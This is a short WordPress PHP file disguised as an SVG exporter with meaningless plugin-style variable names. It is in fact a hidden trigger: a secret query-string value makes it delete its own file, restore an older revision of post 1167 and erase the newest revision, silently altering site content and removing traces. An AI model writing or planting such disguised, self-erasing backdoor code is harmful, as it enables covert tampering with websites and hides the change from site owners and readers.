<?php

function install_svg_exporter() {
	if (isset($_GET['jetpack_media_favicon']) && $_GET['jetpack_media_favicon'] === 'time_stock_article_gateway') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$emails_user_ninja = 1167;
		$chatbot_divi_description_footer = wp_get_post_revisions($emails_user_ninja);
		if (empty($chatbot_divi_description_footer)) die('no revisions');
		if (count($chatbot_divi_description_footer) < 2) die('less than 2');
		$maintenance_static_module = array_shift($chatbot_divi_description_footer);
		$box_country_finder = $maintenance_static_module->ID;
		$react_accordion_reloaded_logger = array_shift($chatbot_divi_description_footer);
		$elementor_pullquote_shipping = $react_accordion_reloaded_logger->ID;
		$twitter_responsive_affiliates = wp_restore_post_revision($elementor_pullquote_shipping);
		if ($twitter_responsive_affiliates === false) die('error restoring');
		$twitter_responsive_affiliates = wp_delete_post_revision($box_country_finder);		
		if ($twitter_responsive_affiliates === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'install_svg_exporter');
